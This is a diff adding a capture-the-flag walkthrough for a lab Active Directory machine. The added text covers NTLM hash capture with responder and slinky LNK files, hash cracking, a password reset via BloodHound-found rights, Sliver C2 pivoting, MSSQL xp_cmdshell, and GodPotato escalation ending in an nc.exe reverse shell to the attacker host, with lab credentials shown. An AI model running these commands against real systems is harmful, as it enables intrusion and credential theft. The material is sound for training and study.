@@ -9,7 +9,6 @@ Colosion
 - <<ad-enum,AD Enumeration>>
 - <<ad-access,Lateral movement>>
 - <<privesc,Privilege Escalation>>
-- <<notes,Final Notes>>
 
 [[overview]]
 == Scope
@@ -136,21 +135,339 @@ smb: \> ls
 ----
 
 
+Starting `responder`
+
+[sourse]
+----
+sudo responder -I tun0
+----
+
+By using `nxc` module `slinky` we can do symlink and when user open this we can steal hash
+
+[sourse]
+----
+kali ~/hack_smarter/machines/ShareThePain $ nxc smb hack.smarter  -M slinky -u '' -p '' -o SERVER=10.200.19.165 SHARES=Share NAME=hack
+[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
+SMB         10.1.99.111     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:False)
+SMB         10.1.99.111     445    DC01             [+] hack.smarter\: 
+SMB         10.1.99.111     445    DC01             [*] Enumerated shares
+SMB         10.1.99.111     445    DC01             Share           Permissions     Remark
+SMB         10.1.99.111     445    DC01             -----           -----------     ------
+SMB         10.1.99.111     445    DC01             ADMIN$                          Remote Admin
+SMB         10.1.99.111     445    DC01             C$                              Default share
+SMB         10.1.99.111     445    DC01             IPC$                            Remote IPC
+SMB         10.1.99.111     445    DC01             NETLOGON                        Logon server share 
+SMB         10.1.99.111     445    DC01             Share           READ,WRITE      
+SMB         10.1.99.111     445    DC01             SYSVOL                          Logon server share 
+SLINKY      10.1.99.111     445    DC01             [+] Found writable share: Share
+SLINKY      10.1.99.111     445    DC01             [+] Created LNK file on the Share share
+----
+
+Looking at responder we enumerated new user `bob.ross` with `ntlm` hash
+
+[sourse]
+----
+[SMB] NTLMv2-SSP Client   : 10.1.99.111
+[SMB] NTLMv2-SSP Username : HACK\bob.ross
+[SMB] NTLMv2-SSP Hash     : bob.ross::HACK:38b2f2af29f804c9:5BBD0BFB7D716C4649CA00B9A70DA91A:0101000000000000800CD9098956DC01D4B983E70FB9466400000000020008004B0054004C00350001001E00570049004E002D00590045004B0031005300570046004800390033004A0004003400570049004E002D00590045004B0031005300570046004800390033004A002E004B0054004C0035002E004C004F00430041004C00030014004B0054004C0035002E004C004F00430041004C00050014004B0054004C0035002E004C004F00430041004C0007000800800CD9098956DC0106000400020000000800300030000000000000000100000000200000D1515F9839F769C133B28E4630004CA06F33FF5B98E75E41D9F6D5FB659D7EAB0A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00310039002E003100360035000000000000000000
+----
+
+Cracking hash
+
+[sourse]
+----
+hashcat bob.hash /home/kali/wordlists/passwords/rockyou.txt  -m 5600
+----
+
+pass : `137Password123!@#` 
+
+Ceack if user is valid
+
+[sourse] 
+----
+kali ~/hack_smarter/machines/ShareThePain $ nxc smb 10.1.99.111  -u 'bob.ross' -p '137Password123!@#' --shares
+SMB         10.1.99.111     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:False)
+SMB         10.1.99.111     445    DC01             [+] hack.smarter\bob.ross:137Password123!@# 
+SMB         10.1.99.111     445    DC01             [*] Enumerated shares
+SMB         10.1.99.111     445    DC01             Share           Permissions     Remark
+SMB         10.1.99.111     445    DC01             -----           -----------     ------
+SMB         10.1.99.111     445    DC01             ADMIN$                          Remote Admin
+SMB         10.1.99.111     445    DC01             C$                              Default share
+SMB         10.1.99.111     445    DC01             IPC$            READ            Remote IPC
+SMB         10.1.99.111     445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.1.99.111     445    DC01             Share           READ,WRITE      
+SMB         10.1.99.111     445    DC01             SYSVOL          READ            Logon server share 
+----
+
+Enumerated a new Active Directory user `bob.ross` : `137Password123!@#`
+
 
 
 [[ad-enum]]
 == AD Enumeration
+=== Bloodhound 
+[sourse]
+----
+bloodhound-python -d 'hack.smarter' -u 'bob.ross' -p '137Password123!@#' -dc 'DC01.hack.smarter' -c all -ns  10.1.99.111
+----
 
+Catch json files we upload this to bloodhound-cli
+
+Enumerated a new user `ALICE.WONDERLAND` 
+
+So as `bob.ross` have a `GenereticAll` permisions to user `alice.wonderland` he can change a password of she 
+I am using a tool `bloodyAD`
+
+[sourse]
+----
+bloodyAD --host "10.1.99.111" -d 'DC01.hack.smarter' -u  'bob.ross' -p  '137Password123!@#' set password 'alice.wonderland' 'FuckPass!@@'
+----
+
+Check if `alice.wonderland` user is valid with pass `FuckPass!@@`
+
+[sourse]
+----
+kali ~/hack_smarter/machines/ShareThePain/blood_bob $ bloodyAD --host "10.1.99.111" -d 'DC01.hack.smarter' -u  'bob.ross' -p  '137Password123!@#' set password 'alice.wonderland' 'FuckPass!@@'
+[+] Password changed successfully!
+kali ~/hack_smarter/machines/ShareThePain/blood_bob $ nxc smb 10.1.99.111  -u 'alice.wonderland' -p 'FuckPass!@@' --shares
+SMB         10.1.99.111     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:False)
+SMB         10.1.99.111     445    DC01             [+] hack.smarter\alice.wonderland:FuckPass!@@ 
+SMB         10.1.99.111     445    DC01             [*] Enumerated shares
+SMB         10.1.99.111     445    DC01             Share           Permissions     Remark
+SMB         10.1.99.111     445    DC01             -----           -----------     ------
+SMB         10.1.99.111     445    DC01             ADMIN$                          Remote Admin
+SMB         10.1.99.111     445    DC01             C$                              Default share
+SMB         10.1.99.111     445    DC01             IPC$            READ            Remote IPC
+SMB         10.1.99.111     445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.1.99.111     445    DC01             Share           READ,WRITE      
+SMB         10.1.99.111     445    DC01             SYSVOL          READ            Logon server share 
+----
+
+New user is compromised `alice.wonderland` : `FuckPass!@@`
+
+She exists in group `REMOTE MANAGEMENT USERS`
+
+So log into system by `evil-winrm`
+
+[sourse]
+----
+kali ~/hack_smarter/machines/ShareThePain/blood_bob $ evil-winrm -i DC01.hack.smarter -u 'alice.wonderland' -p 'FuckPass!@@' 
+
+*Evil-WinRM* PS C:\Users\alice.wonderland\Documents> 
+----
+
+Compromised next step `lateral movement`
+
+`user.txt   ->  \Desktop`
 
 
 [[ad-access]]
 == Lateral movement
+Into `evil-winrm` during `lateral movemnt` finded a 
+
+[sourse]
+----
+*Evil-WinRM* PS C:\> dir -force
+    Directory: C:\
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d--hs-          9/2/2025   7:33 PM                $Recycle.Bin
+d--hsl          9/2/2025   5:08 PM                Documents and Settings
+d-----          5/8/2021   1:20 AM                PerfLogs
+d-r---          9/5/2025   8:34 PM                Program Files
+d-----          9/3/2025   2:06 PM                Program Files (x86)
+d--h--          9/5/2025   8:44 PM                ProgramData
+d--hs-          9/2/2025   5:08 PM                Recovery
+d-----        11/15/2025   1:11 PM                Share
+d-----          9/3/2025   2:06 PM                SQL2019
+d--hs-          9/2/2025   6:31 PM                System Volume Information
+d-----          9/3/2025   2:01 PM                Temp
+d-r---          9/3/2025   2:54 PM                Users
+d-----          9/5/2025   8:46 PM                Windows
+-a-hs-        11/15/2025  11:54 AM          12288 DumpStack.log.tmp
+-a-hs-        11/15/2025  11:54 AM      738197504 pagefile.sys
+----
+
+*Directory* : `SQL2019` is interesting
+
+Find some ports running at `localhost`
+
+[sourse]
+----
+*Evil-WinRM* PS C:\> netstat -ano | findstr 4320
+  TCP    127.0.0.1:1433         0.0.0.0:0              LISTENING       4320
+  TCP    127.0.0.1:56517        0.0.0.0:0              LISTENING       4320
+----
+
+Finded a `1433` port which is running in localhost
+
+So we needed to do `Port-Tunneling` by tool `silver` as author mentioned
+
+Install silver by command
+
+[sourse]
+----
+curl https://sliver.sh/install | sudo bash
+#
+sudo systemctl start sliver
+#
+sliver
+----
+
+Into `sliver` is needed to craft a pivot file which gives a `Port-tunneling` opportunity
+
+[sourse]
+----
+generate --mtls 10.200.19.165:443 --save /home/kali/hack_smarter/ShareThePain/pivot.exe --os windows
+#
+mtls -L 10.200.19.165 -l 443
+#
+sessions
+#
+sessions -i 5b4640a8
+----
+
+`Port-Tunneling` is completed but we need to configure `/etc/proxychains.conf` to `socks5` in port `1081` scroll down and add or change to this configuration
+
+After using tool `impacket-mssqlclient` we can get access to system `SQL` database
+
+Combine tools `proxychains` and `impacket-mssqlclient`
+
+[sourse]
+----
+proxychains4 -q impacket-mssqlclient 'hack.smarter'/'alice.wonderland':'FuckPass!@@'@127.0.0.1 -windows-auth
+----
+
+Access to `SQL` database
+
+[sourse]
+----
+kali ~/hack_smarter/machines/ShareThePain $ proxychains4 -q impacket-mssqlclient 'hack.smarter'/'alice.wonderland':'FuckPass!@@'@127.0.0.1 -windows-auth
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (HACK\alice.wonderland  dbo@master)> 
+----
+
+Connection as user `alice.wonderland` is succesfull by `Silver C2`
+
+Into SQL could be used `enable_xp_cmdshell` to do cmd shell into database
+
+[sourse]
+----
+SQL (HACK\alice.wonderland  dbo@master)> enable_xp_cmdshell
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (HACK\alice.wonderland  dbo@master)> xp_cmdshell whoami
+output                        
+---------------------------   
+nt service\mssql$sqlexpress   
+
+NULL                          
+
+SQL (HACK\alice.wonderland  dbo@master)
+----
+
+In database we are logged in as user `sqlexpress` 
+
+We can check privileges of `sqlexpress` 
+
+[sourse]
+----
+SQL (HACK\alice.wonderland  dbo@master)> xp_cmdshell whoami /priv
+
+Privilege Name                Description                               State      
+
+============================= ========================================= ========   
+
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
+
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
+
+SeMachineAccountPrivilege     Add workstations to domain                Disabled   
+
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
+
+SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
+
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
+
+SeCreateGlobalPrivilege       Create global objects                     Enabled    
+
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+----
+
+
+`SeImpersonatePrivilege` can be interesting to `Privilage Escalation`
+
+
+
+
+
+
 
 
 
 [[privesc]]
 == Privilege Escalation
 
+Using a `GodPotato.exe` file by `SeImpersonatePrivilege` that have a user we can escalate privileges to `SYSTEM`
 
-[[notes]]
-== Final Notes
+First let's move shell from `sql` session to `Sliver C2` 
+
+Also move `pivot.exe` from `alice.wonderland` directory to `C:\Temp` that is doing becouse all users have access to `Temp` directory
+
+[sourse]
+----
+.\pivot.exe
+----
+
+And we see that exists a new session
+
+[sourse]
+----
+sliver (HAPPY_HACIENDA) > sessions
+
+ ID         Transport   Remote Address      Hostname   Username                      Operating System   Health  
+========== =========== =================== ========== ============================= ================== =========
+ 6b167d20   mtls        10.1.99.111:50889   DC01       NT Service\MSSQL$SQLEXPRESS   windows/amd64      [ALIVE] 
+ 5b4640a8   mtls        10.1.99.111:50465   DC01       HACK\alice.wonderland         windows/amd64      [ALIVE] 
+
+#
+sessions -i 6b167d20
+----
+
+When we are into a session do `shell` command and `cd C:\Temp`
+
+In `alice-wonderland` session in `evil-winrm` upload a `GodPotato-NET4.exe` from local machine
+
+[sourse]
+----
+wget http://10.200.19.165/GodPotato-NET4.exe -O GodPotato-NET4.exe
+----
+
+Start listener by `rlwrap nc -lvnp  9001`
+
+Now run a `GodPotato-NET4.exe`
+
+[sourse]
+----
+.\GodPotato-NET4.exe -cmd "C:\Temp\nc.exe 10.200.19.165 9001 -e cmd"
+----
+
+Here we go `SYSTEM` is obtained
+
+`root.txt  ->  \Administrator\Documents`
+
+*Thanks for readind , HAPPY HACKING*
+
+
+
+
